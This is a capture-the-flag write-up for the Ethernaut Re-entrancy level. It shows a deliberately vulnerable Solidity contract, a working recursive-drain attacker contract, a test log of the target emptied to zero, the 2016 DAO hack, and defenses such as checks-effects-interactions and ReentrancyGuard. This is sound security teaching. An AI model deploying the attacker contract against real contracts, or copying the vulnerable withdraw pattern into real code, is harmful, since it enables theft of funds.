# 10 - Re-entrancy

## 1. Challenge Overview

- **Objective**: Steal all the funds from the `Reentrance` contract (`address(instance).balance == 0`).
- **Vulnerability Category**: Re-entrancy / Checks-Effects-Interactions (CEI) Pattern Violation (SWC-107).

---

## 2. Contract Source Code

### Original Ethernaut Code (Solidity 0.6.12)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

### Modernized Code for Local Testing (`src/10-Reentrancy.sol`)

In Solidity 0.8, we use `unchecked` around `balances[msg.sender] -= _amount` because the original Ethernaut contract did NOT use `SafeMath.sub()` on line 24 (they used `-=`), allowing the balance to underflow without reverting when the recursion unwinds:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            // In Solidity 0.6.12 without SafeMath, this underflows silently during unwinding.
            unchecked {
                balances[msg.sender] -= _amount;
            }
        }
    }

    receive() external payable {}
}
```

---

## 3. Vulnerability Analysis

### The Flaw: Breaking the Checks-Effects-Interactions (CEI) Pattern

Look at the sequence of execution inside `withdraw()`:

```solidity
// 1. CHECK
if (balances[msg.sender] >= _amount) {

    // 2. INTERACTION (External Call!)
    (bool result,) = msg.sender.call{value: _amount}("");

    // 3. EFFECT (State Update)
    balances[msg.sender] -= _amount;
}
```

1. **Control Handover**: When `msg.sender.call{value: _amount}("")` executes, control is transferred to the receiving contract's `receive()` function.
2. **Stale State**: At this moment, step 3 (`balances[msg.sender] -= _amount`) **has not run yet**. In the contract's storage, the attacker still has their full balance!
3. **Re-entrant Invocation**: When the attacker's `receive()` function calls `withdraw(_amount)` again:
   - The contract begins a **new** invocation of `withdraw()`.
   - The check `balances[msg.sender] >= _amount` passes again because the balance was never deducted!
   - Another transfer is made, triggering `receive()` again.
4. **The Recursive Drain**: This recursion continues until the target contract has zero funds left, draining the entire contract.

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/attackers/ReentrancyAttack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IReentrance} from "../interfaces/IReentrance.sol";

contract ReentrancyAttack {
    IReentrance public immutable target;
    uint256 public initialDeposit;
    address public immutable owner;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need initial deposit");
        initialDeposit = msg.value;

        // 1. Donate to ourselves to establish balance > 0
        target.donate{value: initialDeposit}(address(this));

        // 2. Initiate the first withdraw, triggering the recursive loop
        target.withdraw(initialDeposit);
    }

    receive() external payable {
        // Recursive loop:
        // As long as the target has funds left, call withdraw() before state update!
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            uint256 toWithdraw = targetBalance < initialDeposit ? targetBalance : initialDeposit;
            target.withdraw(toWithdraw);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

### 2. Proof-of-Concept Test (`test/10-Reentrancy.t.sol`)

```bash
forge test --match-contract ReentrancyTest -vvvv
```

```text
Ran 2 tests for test/10-Reentrancy.t.sol:ReentrancyTest
[PASS] test_InitialContractBalance() (gas: 10183)
[PASS] test_ReentrancyDrainExploit() (gas: 137098)
Logs:
  Local PoC Success: Target contract balance is now: 0
  Attacker wallet balance: 7000000000000000000
Suite result: ok. 2 passed; 0 failed
```

### 3. Execution Script (`script/10-Reentrancy.s.sol`)

1. Reads the target's current balance.
2. Deploys `ReentrancyAttack`.
3. Calls `attackerContract.attack{value: depositAmount}()`.
4. Withdraws all stolen loot to your player wallet via `withdrawFunds()`.
5. Verifies `instance.balance == 0`.

---

## 5. Real-World Case Study: The 2016 DAO Hack

On June 17, 2016, an attacker exploited this exact vulnerability in **The DAO**, a decentralized venture fund holding nearly 15% of all circulating Ether at the time:

- The DAO's `splitDAO` function transferred Ether to the user before updating their token balance.
- The attacker used a recursive fallback function to drain **3.6 million ETH** (~$60M at the time, billions today).
- The fallout led the Ethereum community to execute an unprecedented hard fork to recover the funds, creating the split between **Ethereum (ETH)** and **Ethereum Classic (ETC)**.

---

## 6. Prevention & Defense-in-Depth

### 1. Checks-Effects-Interactions (CEI) Pattern

Always update all internal state variables **before** making external calls:

```solidity
function withdraw(uint256 _amount) public {
    // 1. CHECK
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // 2. EFFECT (Update state FIRST!)
    balances[msg.sender] -= _amount;

    // 3. INTERACTION (External call last!)
    (bool result,) = msg.sender.call{value: _amount}("");
    require(result, "Transfer failed");
}
```

### 2. ReentrancyGuard (`nonReentrant` Modifier)

Use OpenZeppelin's `ReentrancyGuard`:

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeContract is ReentrancyGuard {
    function withdraw(uint256 _amount) public nonReentrant {
        // Safe against re-entrant calls
    }
}
```

### 3. Transient Storage Reentrancy Locks (EIP-1153)

Starting in Ethereum Cancun (2024), EVM opcodes `TSTORE` and `TLOAD` allow ultra-gas-efficient reentrancy locks that clean up their storage at the end of the transaction.
